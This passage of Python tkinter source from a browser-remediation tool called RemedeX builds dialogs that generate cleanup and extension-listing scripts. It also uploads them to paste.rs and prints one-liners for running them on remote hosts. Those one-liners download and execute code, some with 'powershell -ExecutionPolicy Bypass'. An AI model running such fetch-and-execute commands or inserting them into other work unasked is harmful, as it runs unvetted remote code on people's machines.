                     foreground="#666", font=("Segoe UI", 7), wraplength=350).pack(anchor="w", padx=(20, 0))
            
            ttk.Checkbutton(data_right, text="Cookies (will log you out!)", variable=clean_cookies_var).pack(anchor="w", pady=(4, 0))
            ttk.Label(data_right, text="Authentication tokens & session IDs - clearing these logs you out of ALL websites",
                     foreground="#f44", font=("Segoe UI", 7), wraplength=350).pack(anchor="w", padx=(20, 0))
            
            # Description
            desc_frame = ttk.LabelFrame(right_col, text="  Description  ", padding="10", style="Section.TLabelframe")
            desc_frame.pack(fill="both", expand=True, pady=5)
            
            desc_text = tk.StringVar()
            desc_label = ttk.Label(desc_frame, textvariable=desc_text, justify="left", wraplength=750)
            desc_label.pack(anchor="w")
            
            descriptions = {
                "remote_python": """REMOTE PYTHON SCRIPT - Best for remote execution
• Works on Windows, Linux, and Mac
• Can be run via SSH, PSRemoting, Ansible, or any remote execution tool
• Requires Python 3.6+ on target machine (no additional dependencies)
• Use checkboxes above to select which data types to clean
• Use: python browser_cleanup.py --force""",
                "remote_powershell": """REMOTE POWERSHELL SCRIPT - For Windows systems
• Can be deployed via PSRemoting, SCCM, Intune, GPO
• No dependencies required on target
• Use checkboxes above to select which data types to clean
• Use: .\\browser_cleanup.ps1 -Force""",
                "remote_bash": """REMOTE BASH SCRIPT - For Linux/Mac systems
• Can be deployed via SSH, Ansible, Chef, Puppet
• No dependencies beyond bash
• Use checkboxes above to select which data types to clean
• Use: ./browser_cleanup.sh --force""",
                "browser_js": """BROWSER JAVASCRIPT - For manual cleanup
• Clears data for CURRENT WEBSITE ONLY (in browser DevTools console, F12)
• Use checkboxes above to select which data types to clean
• Cannot be run remotely, extension removal not applicable"""
            }
            
            def update_description(*args):
                desc_text.set(descriptions.get(script_type_var.get(), ""))
            
            script_type_var.trace_add("write", update_description)
            update_description()
            
            # Script preview
            script_frame = ttk.LabelFrame(dialog, text="  Generated Script  ", padding="5")
            script_frame.pack(fill="both", expand=True, padx=10, pady=5)
            
            text = scrolledtext.ScrolledText(script_frame, width=90, height=12, font=("Consolas", 9))
            text.pack(fill="both", expand=True)
            
            def generate_script():
                stype = script_type_var.get()
                selected_browsers = [b for b, var in target_browsers_vars.items() if var.get()]
                do_disable_sync = stype != "browser_js"
                do_clean_prefs = stype != "browser_js"
                do_blocklist = blocklist_script_var.get() and stype != "browser_js"
                wh_url = webhook_url_var.get().strip() if stype != "browser_js" else ""
                
                if stype == "remote_python":
                    script = self.manager.generate_remote_cleanup_script("python", target_browsers=selected_browsers, disable_sync=do_disable_sync, clean_preferences=do_clean_prefs, webhook_url=wh_url, apply_blocklist=do_blocklist)
                elif stype == "remote_powershell":
                    script = self.manager.generate_remote_cleanup_script("powershell", target_browsers=selected_browsers, disable_sync=do_disable_sync, clean_preferences=do_clean_prefs, webhook_url=wh_url, apply_blocklist=do_blocklist)
                elif stype == "remote_bash":
                    script = self.manager.generate_remote_cleanup_script("bash", target_browsers=selected_browsers, disable_sync=do_disable_sync, clean_preferences=do_clean_prefs, webhook_url=wh_url, apply_blocklist=do_blocklist)
                else:
                    script = self.manager.generate_browser_script()
                
                # Read checkbox states
                do_ls = clean_localstorage_var.get()
                do_ss = clean_sessionstorage_var.get()
                do_cache = clean_cache_var.get()
                do_sw = clean_serviceworkers_var.get()
                do_idb = clean_indexeddb_var.get()
                do_cookies = clean_cookies_var.get()
                
                # Build a header showing what's enabled/disabled
                enabled = []
                disabled = []
                for label, on in [("LocalStorage", do_ls), ("SessionStorage", do_ss),
                                  ("Cache", do_cache), ("ServiceWorkers", do_sw),
                                  ("IndexedDB", do_idb), ("Cookies", do_cookies)]:
                    (enabled if on else disabled).append(label)
                
                config_header = ""
                if disabled:
                    config_header += f"# CLEANING: {', '.join(enabled)}\n" if enabled else ""
                    config_header += f"# SKIPPING: {', '.join(disabled)}\n"
                
                # --- Apply data-type filtering per script type ---
                
                def _toggle_block_lines(script_text, marker, active, comment_prefix="#"):
                    """Line-based block toggling. Finds '# <marker>' comment and
                    comments out from that line through the closing brace or next
                    blank line."""
                    if active:
                        return script_text
                    lines = script_text.split('\n')
                    result = []
                    skipping = False
                    brace_depth = 0
                    for line in lines:
                        stripped = line.strip()
                        if not skipping and stripped == f'{comment_prefix} {marker}':
                            skipping = True
                            brace_depth = 0
                            indent = line[:len(line) - len(line.lstrip())]
                            result.append(f'{indent}{comment_prefix} [SKIPPED] {marker}')
                            continue
                        if skipping:
                            brace_depth += stripped.count('{') - stripped.count('}')
                            indent = line[:len(line) - len(line.lstrip())] if stripped else ''
                            if stripped:
                                result.append(f'{indent}{comment_prefix} [SKIPPED] {stripped}')
                            else:
                                result.append(line)
                            if brace_depth <= 0 and (stripped.endswith('}') or stripped == ''):
                                skipping = False
                            continue
                        result.append(line)
                    return '\n'.join(result)
                
                if stype == "remote_powershell":
                    script = _toggle_block_lines(script, "LocalStorage", do_ls, "#")
                    script = _toggle_block_lines(script, "Session Storage", do_ss, "#")
                    script = _toggle_block_lines(script, "Cache", do_cache, "#")
                    script = _toggle_block_lines(script, "Service Workers", do_sw, "#")
                    script = _toggle_block_lines(script, "IndexedDB", do_idb, "#")
                    if not do_cookies:
                        # Comment out Chromium cookie blocks
                        script = _toggle_block_lines(script, "Cookies (optional)", False, "#")
                    elif do_cookies:
                        script = script.replace(
                            '[switch]$IncludeCookies,',
                            '[switch]$IncludeCookies = $true,  # Cookies enabled by default'
                        )
                
                elif stype == "remote_bash":
                    script = _toggle_block_lines(script, "LocalStorage", do_ls, "#")
                    script = _toggle_block_lines(script, "Session Storage", do_ss, "#")
                    script = _toggle_block_lines(script, "Cache", do_cache, "#")
                    script = _toggle_block_lines(script, "Service Workers", do_sw, "#")
                    script = _toggle_block_lines(script, "IndexedDB", do_idb, "#")
                    if do_cookies:
                        script = script.replace('INCLUDE_COOKIES=false', 'INCLUDE_COOKIES=true  # Cookies enabled')
                    else:
                        script = script.replace(
                            'if $INCLUDE_COOKIES; then',
                            'if false; then  # [SKIPPED] Cookies disabled'
                        )
                
                elif stype == "remote_python":
                    skip_dirs = []
                    if not do_ls:
                        skip_dirs.append('"Local Storage"')
                    if not do_ss:
                        skip_dirs.append('"Session Storage"')
                    if not do_cache:
                        skip_dirs.append('"Cache_Data"')
                    if not do_sw:
                        skip_dirs.append('"Service Worker"')
                    if not do_idb:
                        skip_dirs.append('"IndexedDB"')
                    
                    if skip_dirs:
                        script = script.replace(
                            '        for dir_path in clear_dirs:\n'
                            '            if dir_path.exists():',
                            '        # Filter out disabled data types\n'
                            f'        skip_names = [{", ".join(skip_dirs)}]\n'
                            '        for dir_path in clear_dirs:\n'
                            '            if any(s in str(dir_path) for s in skip_names):\n'
                            '                log(f"    Skipped {dir_path.name} (disabled)")\n'
                            '                continue\n'
                            '            if dir_path.exists():',
                            1
                        )
                    
                    if do_cookies:
                        script = script.replace(
                            'parser.add_argument("--cookies", action="store_true", help="Also clear cookies")',
                            'parser.add_argument("--cookies", action="store_true", default=True, help="Also clear cookies (enabled)")'
                        )
                    
                elif stype == "browser_js":
                    if not do_ls:
                        script = script.replace("localStorage.clear();", "// [SKIPPED] localStorage.clear();")
                    if not do_ss:
                        script = script.replace("sessionStorage.clear();", "// [SKIPPED] sessionStorage.clear();")
                    if not do_cache:
                        script = re.sub(
                            r"(// Clear caches.*?console\.log\([^)]*[Cc]ache[^)]*\);)",
                            lambda m: "\n".join("// [SKIPPED] " + l for l in m.group(0).splitlines()),
                            script, flags=re.DOTALL, count=1
                        )
                    if not do_sw:
                        script = re.sub(
                            r"(// Unregister service workers.*?console\.log\([^)]*[Ss]ervice [Ww]orker[^)]*\);)",
                            lambda m: "\n".join("// [SKIPPED] " + l for l in m.group(0).splitlines()),
                            script, flags=re.DOTALL, count=1
                        )
                    if not do_idb:
                        script = re.sub(
                            r"(// Clear IndexedDB.*?console\.log\([^)]*IndexedDB[^)]*\);)",
                            lambda m: "\n".join("// [SKIPPED] " + l for l in m.group(0).splitlines()),
                            script, flags=re.DOTALL, count=1
                        )
                    if do_cookies:
                        script += "\n// Clear cookies\ndocument.cookie.split(';').forEach(c => { document.cookie = c.trim().split('=')[0] + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/'; });\nconsole.log('Cleared cookies for this domain');\n"
                
                # --- Inject extension IDs ---
                ext_ids_raw = ext_id_text.get("1.0", "end").strip()
                ext_ids = [eid.strip() for eid in ext_ids_raw.splitlines() if eid.strip()] if ext_ids_raw else []
                
                if ext_ids and stype != "browser_js":
                    ids_display = ", ".join(ext_ids)
                    config_header += f"# EXTENSIONS TO REMOVE: {ids_display}\n"
                    
                    if stype == "remote_powershell":
                        ids_ps = ", ".join(f"'{eid}'" for eid in ext_ids)
                        script = script.replace(
                            '$RemoveExtension = @()',
                            f'$RemoveExtension = @({ids_ps})',
                            1
                        )
                    elif stype == "remote_python":
                        default_list = ", ".join(f'"{eid}"' for eid in ext_ids)
                        script = script.replace(
                            'parser.add_argument("--remove-ext", action="append", dest="remove_extensions",',
                            f'parser.add_argument("--remove-ext", action="append", dest="remove_extensions",\n'
                            f'                       default=[{default_list}],',
                            1
                        )
                    elif stype == "remote_bash":
                        ids_bash = " ".join(f'"{eid}"' for eid in ext_ids)
                        config_header += f'REMOVE_EXTENSIONS=({ids_bash})\n'
                        
                # Add browser targets for Python/Bash (Powershell natively handled by manager)
                if selected_browsers and len(selected_browsers) < 5 and stype != "browser_js":
                    config_header += f"# TARGET BROWSERS: {', '.join(selected_browsers)}\n"
                    if stype == "remote_python":
                        b_list = ",".join(selected_browsers).lower()
                        script = script.replace(
                            'parser.add_argument("--browsers", default="all"',
                            f'parser.add_argument("--browsers", default="{b_list}"',
                            1
                        )
                    elif stype == "remote_bash":
                        b_bash = " ".join(b.lower() for b in selected_browsers)
                        script = script.replace(
                            'TARGET_BROWSERS=""',
                            f'TARGET_BROWSERS="{b_bash}"'
                        )
                
                
                # Prepend config header
                if config_header:
                    comment_char = "//" if stype == "browser_js" else "#"
                    header_lines = []
                    header_lines.append(f"{comment_char} " + "=" * 60)
                    header_lines.append(f"{comment_char} CUSTOM CONFIGURATION (generated by RemedeX)")
                    for line in config_header.strip().splitlines():
                        header_lines.append(line.replace("#", comment_char, 1) if stype == "browser_js" else line)
                    header_lines.append(f"{comment_char} " + "=" * 60)
                    header_lines.append("")
                    script = "\n".join(header_lines) + "\n" + script
                
                text.delete(1.0, "end")
                text.insert(1.0, script)
                return script
            
            generate_script()
            script_type_var.trace_add("write", lambda *args: generate_script())
            apply_btn.configure(command=generate_script)
            
            def copy_script():
                script = text.get(1.0, "end-1c")
                self.root.clipboard_clear()
                self.root.clipboard_append(script)
                messagebox.showinfo("Copied", "Script copied to clipboard!")
            
            def save_script():
                from tkinter import filedialog
                stype = script_type_var.get()
                extensions = {
                    "remote_python": (".py", [("Python files", "*.py")], "browser_cleanup.py"),
                    "remote_powershell": (".ps1", [("PowerShell files", "*.ps1")], "browser_cleanup.ps1"),
                    "remote_bash": (".sh", [("Shell scripts", "*.sh")], "browser_cleanup.sh"),
                    "browser_js": (".js", [("JavaScript files", "*.js")], "browser_cleanup.js"),
                }
                ext, ftypes, fname = extensions.get(stype, (".txt", [("Text files", "*.txt")], "script.txt"))
                
                path = filedialog.asksaveasfilename(defaultextension=ext, filetypes=ftypes, initialfile=fname)
                if path:
                    with open(path, 'w', encoding='utf-8') as f:
                        f.write(text.get(1.0, "end-1c"))
                    messagebox.showinfo("Saved", f"Script saved to:\n{path}")
            
            def upload_and_share():
                stype = script_type_var.get()
                script_content = text.get(1.0, "end-1c")
                if not script_content.strip():
                    messagebox.showwarning("Empty", "Generate a script first.")
                    return
                
                type_map = {"remote_python": "python", "remote_powershell": "powershell",
                            "remote_bash": "bash", "browser_js": "text"}
                lang = type_map.get(stype, "text")
                
                share_dialog = self._make_toplevel(dialog)
                share_dialog.title("Upload & Share Script")
                self._fit_to_screen(share_dialog, 620, 380)
                share_dialog.grab_set()
                _dm = getattr(self, 'is_dark_mode', False)
                _txt_bg = "#313338" if _dm else "#f0f0f0"
                _txt_bg_alt = "#1a3d24" if _dm else "#e8f5e9"
                _txt_fg = "#dcddde" if _dm else "#000000"
                
                status_label = ttk.Label(share_dialog, text="Uploading script to paste.rs...", font=("Segoe UI", 10))
                status_label.pack(padx=20, pady=(20, 10))
                progress = ttk.Progressbar(share_dialog, mode="indeterminate")
                progress.pack(fill="x", padx=20, pady=(0, 10))
                progress.start()
                cancel_btn = ttk.Button(share_dialog, text="Cancel", command=share_dialog.destroy, width=10)
                cancel_btn.pack(pady=(0, 10))
                
                content_frame = ttk.Frame(share_dialog, padding="10")
                
                def do_upload():
                    try:
                        print(f"[Upload] Starting upload ({len(script_content)} bytes, lang={lang})...")
                        result = self.manager.upload_script(script_content, lang)
                        print(f"[Upload] Success: {result.get('url', '?')}")
                        if share_dialog.winfo_exists():
                            share_dialog.after(0, lambda: show_result(result))
                    except Exception as e:
                        err_msg = f"{type(e).__name__}: {e}"
                        print(f"[Upload] Failed: {err_msg}")
                        if share_dialog.winfo_exists():
                            share_dialog.after(0, lambda m=err_msg: show_error(m))
                
                def show_result(result):
                    progress.stop()
                    progress.pack_forget()
                    cancel_btn.pack_forget()
                    status_label.configure(text="Script uploaded successfully!", foreground="green")
                    
                    content_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))
                    
                    raw_url = result["raw_url"]
                    ext_map = {"python": "cleanup.py", "powershell": "cleanup.ps1", "bash": "cleanup.sh", "text": "cleanup.js"}
                    default_fname = ext_map.get(lang, "cleanup.txt")
                    
                    def get_oneliners(save_to_file=False, fname=""):
                        fn = fname or default_fname
                        if save_to_file:
                            if lang in ("bash", "sh"):
                                primary = f'curl -sL "{raw_url}" -o {fn} && chmod +x {fn} && ./{fn}'
                                alt = f'wget -qO {fn} "{raw_url}" && chmod +x {fn} && ./{fn}'
                            elif lang in ("powershell", "ps1"):
                                primary = f"irm '{raw_url}' -OutFile {fn}; .\\{fn}"
                                alt = f"powershell -ExecutionPolicy Bypass -Command \"irm '{raw_url}' -OutFile {fn}; .\\{fn}\""
                            else:
                                primary = f'curl -sL "{raw_url}" -o {fn} && python3 {fn}'
                                alt = f'wget -qO {fn} "{raw_url}" && python3 {fn}'
                        else:
                            primary = result["oneliner"]
                            alt = result["oneliner_alt"]
                        return primary, alt
                    
                    ttk.Label(content_frame, text="Paste URL:", font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(5, 2))
                    url_text = tk.Text(content_frame, height=1, width=60, font=("Consolas", 10),
                                       bg=_txt_bg, fg=_txt_fg, relief="solid", borderwidth=1)
                    url_text.insert("1.0", result["url"])
                    url_text.configure(state="disabled")
                    url_text.pack(fill="x", pady=(0, 8))
                    
                    save_file_var = tk.BooleanVar(value=False)
                    fname_var = tk.StringVar(value=default_fname)
                    
                    opt_row = ttk.Frame(content_frame)
                    opt_row.pack(fill="x", pady=(0, 6))
                    ttk.Checkbutton(opt_row, text="Download to file first:", variable=save_file_var,
                                   command=lambda: update_commands()).pack(side="left")
                    fname_entry = ttk.Entry(opt_row, textvariable=fname_var, width=20, font=("Consolas", 9))
                    fname_entry.pack(side="left", padx=(5, 0))
                    fname_var.trace_add("write", lambda *_: update_commands())
                    
                    ttk.Label(content_frame, text="Run on remote host:", font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(0, 2))
                    cmd_text = tk.Text(content_frame, height=1, width=60, font=("Consolas", 10),
                                       bg=_txt_bg_alt, fg=_txt_fg, relief="solid", borderwidth=1)
                    cmd_text.insert("1.0", result["oneliner"])
                    cmd_text.configure(state="disabled")
                    cmd_text.pack(fill="x", pady=(0, 8))
                    
                    ttk.Label(content_frame, text="Alternative:", font=("Segoe UI", 9)).pack(anchor="w", pady=(0, 2))
                    alt_text = tk.Text(content_frame, height=1, width=60, font=("Consolas", 10),
                                       bg=_txt_bg, fg=_txt_fg, relief="solid", borderwidth=1)
                    alt_text.insert("1.0", result["oneliner_alt"])
                    alt_text.configure(state="disabled")
                    alt_text.pack(fill="x", pady=(0, 8))
                    
                    def update_commands():
                        primary, alt = get_oneliners(save_file_var.get(), fname_var.get().strip())
                        cmd_text.configure(state="normal")
                        cmd_text.delete("1.0", "end")
                        cmd_text.insert("1.0", primary)
                        cmd_text.configure(state="disabled")
                        alt_text.configure(state="normal")
                        alt_text.delete("1.0", "end")
                        alt_text.insert("1.0", alt)
                        alt_text.configure(state="disabled")
                    
                    ttk.Label(content_frame, text="Paste expires automatically. Use within 1 day.",
                             foreground="#888", font=("Segoe UI", 8)).pack(anchor="w", pady=(0, 6))
                    
                    btn_row = ttk.Frame(content_frame)
                    btn_row.pack(fill="x")
                    def copy_oneliner():
                        primary, _ = get_oneliners(save_file_var.get(), fname_var.get().strip())
                        self.root.clipboard_clear()
                        self.root.clipboard_append(primary)
                        messagebox.showinfo("Copied", "One-liner copied to clipboard!", parent=share_dialog)
                    def copy_url():
                        self.root.clipboard_clear()
                        self.root.clipboard_append(result["url"])
                        messagebox.showinfo("Copied", "URL copied to clipboard!", parent=share_dialog)
                    ttk.Button(btn_row, text="Copy One-liner", command=copy_oneliner, width=16).pack(side="left", padx=(0, 5))
                    ttk.Button(btn_row, text="Copy URL", command=copy_url, width=12).pack(side="left", padx=(0, 5))
                    ttk.Button(btn_row, text="Close", command=share_dialog.destroy, width=10).pack(side="left")
                
                def show_error(err):
                    progress.stop()
                    progress.pack_forget()
                    status_label.configure(text=f"Upload failed: {err}", foreground="red")
                    ttk.Button(share_dialog, text="Close", command=share_dialog.destroy).pack(pady=10)
                
                import threading
                threading.Thread(target=do_upload, daemon=True).start()
            
            btn_frame = ttk.Frame(dialog, padding="10")
            btn_frame.pack(fill="x")
            ttk.Button(btn_frame, text="📋 Copy", command=copy_script, width=10).pack(side="left", padx=(0, 4))
            ttk.Button(btn_frame, text="💾 Save", command=save_script, width=10).pack(side="left", padx=(0, 4))
            ttk.Button(btn_frame, text="🔗 Upload & Share", command=upload_and_share, width=18).pack(side="left", padx=(0, 4))
            ttk.Button(btn_frame, text="🔄 Refresh", command=generate_script, width=10).pack(side="left", padx=(0, 4))
            ttk.Button(btn_frame, text="Close", command=dialog.destroy, width=8).pack(side="left")
        
        def show_extension_lister_dialog(self):
            """Show dialog to generate OS-specific extension listing scripts"""
            dialog = self._make_toplevel()
            dialog.title("Remote Extension Lister")
            self._fit_to_screen(dialog, 800, 850, min_w=750, min_h=750)
            
            header = ttk.Frame(dialog, padding="10")
            header.pack(fill="x")
            ttk.Label(header, text="Remote Extension Lister",
                     font=("Segoe UI", 14, "bold")).pack(anchor="w")
            ttk.Label(header, text="Generate a script to list all browser extensions on a remote system. "
                     "Copy and run it on the target machine to discover extension IDs.",
                     foreground="#666", wraplength=700).pack(anchor="w")
            
            # OS selection
            os_frame = ttk.LabelFrame(dialog, text="  Target Operating System  ", padding="10", style="Section.TLabelframe")
            os_frame.pack(fill="x", padx=10, pady=5)
            
            os_row = ttk.Frame(os_frame)
            os_row.pack(fill="x")
            ttk.Label(os_row, text="OS:").pack(side="left", padx=(0, 8))
            os_var = tk.StringVar(value="windows")
            os_combo = ttk.Combobox(os_row, textvariable=os_var, state="readonly", width=25,
                                   values=["windows", "mac", "linux"])
            os_combo.pack(side="left")
            
            apply_btn = ttk.Button(os_row, text="Apply & Regenerate")
            apply_btn.pack(side="right")
            
            ttk.Label(os_frame, 
                     text="Windows = PowerShell script  |  Mac/Linux = Bash script  |  "
                     "Output: extension name, ID, version, and status for Chrome, Edge, and Brave",
                     foreground="#666", font=("Segoe UI", 8)).pack(anchor="w", pady=(5, 0))
            
            # Webhook URL input
            webhook_frame = ttk.LabelFrame(dialog, text="  Webhook Notification (optional)  ", padding="10", style="Section.TLabelframe")
            webhook_frame.pack(fill="x", padx=10, pady=(0, 5))
            
            wh_row = ttk.Frame(webhook_frame)
            wh_row.pack(fill="x")
            ttk.Label(wh_row, text="URL:").pack(side="left")
            lister_webhook_var = tk.StringVar(value="")
            ttk.Entry(wh_row, textvariable=lister_webhook_var, width=50, font=("Consolas", 9)).pack(side="left", fill="x", expand=True, padx=(5, 0))
            wh_help = ttk.Label(wh_row, text="(?)", foreground="#0066cc", cursor="hand2")
            wh_help.pack(side="left", padx=(5, 0))
            wh_help.bind("<Button-1>", lambda e: messagebox.showinfo("Webhook Help",
                "If a URL is provided, the lister script will send the full extension list "
                "to this webhook as a JSON POST request after scanning.\n\n"
                "The payload includes: hostname, user, OS, timestamp, and the complete "
                "list of extensions found (name, ID, version, browser, profile, user).\n\n"
                "Leave blank to disable."))
            ttk.Label(webhook_frame, text="Send the discovered extension list to this URL after scanning.",
                     foreground="#666", font=("Segoe UI", 8)).pack(anchor="w", pady=(3, 0))

            # Network IOC extraction option
            ioc_frame = ttk.LabelFrame(dialog, text="  Network IOC Extraction (optional)  ", padding="10", style="Section.TLabelframe")
            ioc_frame.pack(fill="x", padx=10, pady=(0, 5))
            ioc_var = tk.BooleanVar(value=False)
            ioc_chk = ttk.Checkbutton(ioc_frame, text="Extract network IOCs (domains, IPs) from extension source code on the remote host",
                                      variable=ioc_var)
            ioc_chk.pack(anchor="w")
            ttk.Label(ioc_frame,
                     text="Scans .js files in each extension for URLs, domains, IPs, and base64-hidden indicators.\n"
                     "Results are displayed in the console output and included in the webhook JSON payload\n"
                     "(each extension gains a 'network_iocs' array). No internet access required.\n"
                     "⚠ Mac/Linux: Requires python3 on the target host. Windows (PowerShell) works natively.",
                     foreground="#666", font=("Segoe UI", 8)).pack(anchor="w", pady=(3, 0))

            # Metadata enrichment option
            enrich_frame = ttk.LabelFrame(dialog, text="  Web Store Metadata (optional)  ", padding="10", style="Section.TLabelframe")
            enrich_frame.pack(fill="x", padx=10, pady=(0, 5))
            enrich_var = tk.BooleanVar(value=False)
            enrich_chk = ttk.Checkbutton(enrich_frame, text="Enrich with Chrome Web Store metadata (user count, rating, store URL)",
                                         variable=enrich_var)
            enrich_chk.pack(anchor="w")
            ttk.Label(enrich_frame,
                     text="⚠ CAUTION: This downloads the Chrome Web Store page (~700KB) for each unique extension.\n"
                     "Can add significant time depending on the number of extensions and network speed.\n"
                     "Requires internet access on the target host. Uses PowerShell on Windows, curl on Mac/Linux.",
                     foreground="#996600", font=("Segoe UI", 8)).pack(anchor="w", pady=(3, 0))

            # Script preview
            script_frame = ttk.LabelFrame(dialog, text="  Generated Script (copy & run on target)  ", padding="5", style="Section.TLabelframe")
            script_frame.pack(fill="both", expand=True, padx=10, pady=5)
            
            script_text = scrolledtext.ScrolledText(script_frame, width=85, height=18, font=("Consolas", 9))
            script_text.pack(fill="both", expand=True)
            
            def update_script(*args):
                target = os_var.get()
                wh_url = lister_webhook_var.get().strip()
                enrich = enrich_var.get()
                iocs = ioc_var.get()
                s = self.manager.generate_lister_script(target, webhook_url=wh_url, enrich_metadata=enrich, extract_iocs=iocs)
                script_text.delete(1.0, "end")
                script_text.insert(1.0, s)
            
            def copy_to_clipboard():
                content = script_text.get(1.0, "end-1c")
                self.root.clipboard_clear()
                self.root.clipboard_append(content)
                messagebox.showinfo("Copied", "Script copied to clipboard!\n\n"
                                   "Paste and run it on the target machine to list all extensions.")
            
            def save_script():
                from tkinter import filedialog
                target = os_var.get()
                if target in ("windows", "win"):
                    ext, ftypes, fname = ".ps1", [("PowerShell files", "*.ps1")], "extension_lister.ps1"
                else:
                    ext, ftypes, fname = ".sh", [("Shell scripts", "*.sh")], "extension_lister.sh"
                path = filedialog.asksaveasfilename(defaultextension=ext, filetypes=ftypes, initialfile=fname)
                if path:
                    with open(path, 'w', encoding='utf-8') as f:
                        f.write(script_text.get(1.0, "end-1c"))
                    messagebox.showinfo("Saved", f"Script saved to:\n{path}")
            
            def upload_and_share_lister():
                script_content = script_text.get(1.0, "end-1c")
                if not script_content.strip():
                    messagebox.showwarning("Empty", "Generate a script first.")
                    return
                target = os_var.get()
                lang = "powershell" if target in ("windows", "win") else "bash"
                
                share_dialog = self._make_toplevel(dialog)
                share_dialog.title("Upload & Share Lister Script")
                self._fit_to_screen(share_dialog, 620, 380)
                share_dialog.grab_set()
                _dm = getattr(self, 'is_dark_mode', False)
                _txt_bg = "#313338" if _dm else "#f0f0f0"
                _txt_bg_alt = "#1a3d24" if _dm else "#e8f5e9"
                _txt_fg = "#dcddde" if _dm else "#000000"
                
                status_label = ttk.Label(share_dialog, text="Uploading script...", font=("Segoe UI", 10))
                status_label.pack(padx=20, pady=(20, 10))
                progress = ttk.Progressbar(share_dialog, mode="indeterminate")
                progress.pack(fill="x", padx=20, pady=(0, 10))
                progress.start()
                cancel_btn = ttk.Button(share_dialog, text="Cancel", command=share_dialog.destroy, width=10)
                cancel_btn.pack(pady=(0, 10))
                
                content_frame = ttk.Frame(share_dialog, padding="10")
                
                def do_upload():
                    try:
                        result = self.manager.upload_script(script_content, lang)
                        if share_dialog.winfo_exists():
                            share_dialog.after(0, lambda: show_result(result))
                    except Exception as e:
                        err_msg = f"{type(e).__name__}: {e}"
                        if share_dialog.winfo_exists():
                            share_dialog.after(0, lambda m=err_msg: show_error(m))
                
                def show_result(result):
                    progress.stop()
                    progress.pack_forget()
                    cancel_btn.pack_forget()
                    status_label.configure(text="Script uploaded successfully!", foreground="green")
                    
                    raw_url = result["raw_url"]
                    ext_map = {"powershell": "lister.ps1", "bash": "lister.sh"}
                    default_fname = ext_map.get(lang, "lister.txt")
                    
                    content_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))
                    
                    def get_oneliners(save_to_file=False, fname=""):
                        fn = fname or default_fname
                        if save_to_file:
                            if lang in ("bash", "sh"):
                                primary = f'curl -sL "{raw_url}" -o {fn} && chmod +x {fn} && ./{fn}'
                                alt = f'wget -qO {fn} "{raw_url}" && chmod +x {fn} && ./{fn}'
                            else:
                                primary = f"irm '{raw_url}' -OutFile {fn}; .\\{fn}"
                                alt = f"powershell -ExecutionPolicy Bypass -Command \"irm '{raw_url}' -OutFile {fn}; .\\{fn}\""
                        else:
                            primary = result["oneliner"]
                            alt = result["oneliner_alt"]
                        return primary, alt
                    
                    ttk.Label(content_frame, text="Paste URL:", font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(5, 2))
                    url_text = tk.Text(content_frame, height=1, width=60, font=("Consolas", 10),
                                       bg=_txt_bg, fg=_txt_fg, relief="solid", borderwidth=1)
                    url_text.insert("1.0", result["url"])
                    url_text.configure(state="disabled")
                    url_text.pack(fill="x", pady=(0, 8))
                    
                    save_file_var = tk.BooleanVar(value=False)
                    fname_var = tk.StringVar(value=default_fname)
                    opt_row = ttk.Frame(content_frame)
                    opt_row.pack(fill="x", pady=(0, 6))
                    ttk.Checkbutton(opt_row, text="Download to file first:", variable=save_file_var,
                                   command=lambda: update_cmds()).pack(side="left")
                    ttk.Entry(opt_row, textvariable=fname_var, width=20, font=("Consolas", 9)).pack(side="left", padx=(5, 0))
                    fname_var.trace_add("write", lambda *_: update_cmds())
                    
                    ttk.Label(content_frame, text="Run on remote host:", font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(0, 2))
                    cmd_text = tk.Text(content_frame, height=1, width=60, font=("Consolas", 10),
                                       bg=_txt_bg_alt, fg=_txt_fg, relief="solid", borderwidth=1)
                    cmd_text.insert("1.0", result["oneliner"])
                    cmd_text.configure(state="disabled")
                    cmd_text.pack(fill="x", pady=(0, 8))
                    
                    ttk.Label(content_frame, text="Alternative:", font=("Segoe UI", 9)).pack(anchor="w", pady=(0, 2))
                    alt_text = tk.Text(content_frame, height=1, width=60, font=("Consolas", 10),
                                       bg=_txt_bg, fg=_txt_fg, relief="solid", borderwidth=1)
                    alt_text.insert("1.0", result["oneliner_alt"])
                    alt_text.configure(state="disabled")
                    alt_text.pack(fill="x", pady=(0, 8))
                    
                    def update_cmds():
                        primary, alt = get_oneliners(save_file_var.get(), fname_var.get().strip())
                        cmd_text.configure(state="normal"); cmd_text.delete("1.0", "end"); cmd_text.insert("1.0", primary); cmd_text.configure(state="disabled")
                        alt_text.configure(state="normal"); alt_text.delete("1.0", "end"); alt_text.insert("1.0", alt); alt_text.configure(state="disabled")
                    
                    ttk.Label(content_frame, text="Paste expires automatically after 1 day.",
                             foreground="#888", font=("Segoe UI", 8)).pack(anchor="w", pady=(0, 6))
                    btn_row = ttk.Frame(content_frame)
                    btn_row.pack(fill="x")
                    def copy_oneliner():
                        primary, _ = get_oneliners(save_file_var.get(), fname_var.get().strip())
                        self.root.clipboard_clear(); self.root.clipboard_append(primary)
                        messagebox.showinfo("Copied", "One-liner copied to clipboard!", parent=share_dialog)
                    ttk.Button(btn_row, text="Copy One-liner", command=copy_oneliner, width=16).pack(side="left", padx=(0, 5))
                    ttk.Button(btn_row, text="Close", command=share_dialog.destroy, width=10).pack(side="left")
                
                def show_error(err):
                    progress.stop(); progress.pack_forget()
                    status_label.configure(text=f"Upload failed: {err}", foreground="red")
                    ttk.Button(share_dialog, text="Close", command=share_dialog.destroy).pack(pady=10)
                
                import threading
                threading.Thread(target=do_upload, daemon=True).start()
            
            update_script()
            os_var.trace_add("write", update_script)
            enrich_var.trace_add("write", update_script)
            lister_webhook_var.trace_add("write", update_script)
            apply_btn.configure(command=update_script)
            
            btn_frame = ttk.Frame(dialog, padding="10")
            btn_frame.pack(fill="x")
            ttk.Button(btn_frame, text="📋 Copy", command=copy_to_clipboard, width=10).pack(side="left", padx=(0, 4))
            ttk.Button(btn_frame, text="💾 Save", command=save_script, width=10).pack(side="left", padx=(0, 4))
            ttk.Button(btn_frame, text="🔗 Upload & Share", command=upload_and_share_lister, width=18).pack(side="left", padx=(0, 4))
            ttk.Button(btn_frame, text="🔄 Refresh", command=update_script, width=10).pack(side="left", padx=(0, 4))
            ttk.Button(btn_frame, text="Close", command=dialog.destroy, width=8).pack(side="left")
        
